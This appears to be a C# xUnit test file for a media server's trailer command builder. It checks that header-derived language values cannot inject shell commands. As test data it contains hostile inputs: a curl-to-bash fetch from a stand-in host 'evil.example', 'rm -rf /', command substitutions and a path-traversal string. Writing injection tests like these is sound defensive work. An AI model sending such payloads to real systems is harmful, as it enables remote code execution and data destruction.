// -----------------------------------------------------------------------------
//  Copyright (c) 2024-present NoMercy Entertainment. All rights reserved.
//
//  This file is part of NoMercy MediaServer, source-available software (NOT open
//  source). Personal use and contributions are welcome; distribution, resale,
//  relicensing, and commercial exploitation are prohibited without explicit
//  written consent. See LICENSE for full terms. Distributed WITHOUT ANY WARRANTY.
//
//  SPDX-License-Identifier: LicenseRef-NoMercy-Proprietary
// -----------------------------------------------------------------------------

using NoMercy.Api.Controllers.V1.Media;
using Xunit;

namespace NoMercy.Tests.Api.Media;

public class TrailerCommandBuilderTests
{
    private const string Ytdlp = "/opt/yt-dlp";
    private const string Ffmpeg = "/opt/ffmpeg";
    private const string TrailerId = "dQw4w9WgXcQ";

    [Fact]
    public void Build_MaliciousAcceptLanguage_IsNotInterpolatedIntoTheCommand()
    {
        // The exact shape BaseController.Language() can produce from a crafted
        // Accept-Language header (it only splits on '_', so this reaches Build intact).
        string payload = "en\"; curl http://evil.example/x.sh | bash #";

        string command = TrailerCommandBuilder.Build(ytdlpPath: Ytdlp, ffmpegPath: Ffmpeg, trailerId: TrailerId, language: payload);

        command.Should().NotContain(unexpected: "evil.example");
        command.Should().NotContain(unexpected: "curl");
        command.Should().NotContain(unexpected: payload);
        // The subtitle argument is dropped entirely for an unsafe language.
        command.Should().NotContain(unexpected: "--write-subs");
        // ...but the trailer still fetches.
        command.Should().Contain(expected: TrailerId);
        command.Should().Contain(expected: $"| {Ffmpeg}");
    }

    [Theory]
    [InlineData(data: "en")]
    [InlineData(data: "en-US")]
    [InlineData(data: "pt-BR")]
    [InlineData(data: "zh-Hans")]
    public void Build_SafeLocale_IncludesSubtitleArgument(string language)
    {
        string command = TrailerCommandBuilder.Build(ytdlpPath: Ytdlp, ffmpegPath: Ffmpeg, trailerId: TrailerId, language: language);

        command
            .Should()
            .Contain(expected: $" -o \"subtitle:{language}.%(ext)s\" --sub-langs all --write-subs ");
    }

    [Theory]
    [InlineData(data: "")]
    [InlineData(data: null)]
    [InlineData(data: "en; rm -rf /")]
    [InlineData(data: "en`id`")]
    [InlineData(data: "$(id)")]
    [InlineData(data: "../../etc/passwd")]
    [InlineData(data: "en US")]
    public void Build_UnsafeOrEmptyLanguage_OmitsSubtitleArgument(string? language)
    {
        string command = TrailerCommandBuilder.Build(ytdlpPath: Ytdlp, ffmpegPath: Ffmpeg, trailerId: TrailerId, language: language);

        command.Should().NotContain(unexpected: "--write-subs");
        command.Should().NotContain(unexpected: "subtitle:");
    }

    [Fact]
    public void Build_AlwaysContainsCorePipeline()
    {
        string command = TrailerCommandBuilder.Build(ytdlpPath: Ytdlp, ffmpegPath: Ffmpeg, trailerId: TrailerId, language: "en");

        command.Should().StartWith(expected: Ytdlp);
        command.Should().Contain(expected: TrailerId);
        command.Should().Contain(expected: $"| {Ffmpeg} -i pipe:");
        command.Should().Contain(expected: "video.m3u8");
    }

    [Theory]
    [InlineData(data: ["en", true])]
    [InlineData(data: ["EN", true])]
    [InlineData(data: ["en-US", true])]
    [InlineData(data: ["pt-BR", true])]
    [InlineData(data: ["zh-Hans", true])]
    [InlineData(data: [null, false])]
    [InlineData(data: ["", false])]
    [InlineData(data: ["a", false])]
    [InlineData(data: ["english", false])]
    [InlineData(data: ["en_US", false])]
    [InlineData(data: ["en ", false])]
    [InlineData(data: ["en\"", false])]
    [InlineData(data: ["en;ls", false])]
    [InlineData(data: ["$(id)", false])]
    [InlineData(data: ["`id`", false])]
    [InlineData(data: ["../x", false])]
    public void IsSafeLanguage_MatchesOnlyLocaleTokens(string? language, bool expected)
    {
        TrailerCommandBuilder.IsSafeLanguage(language: language).Should().Be(expected: expected);
    }
}
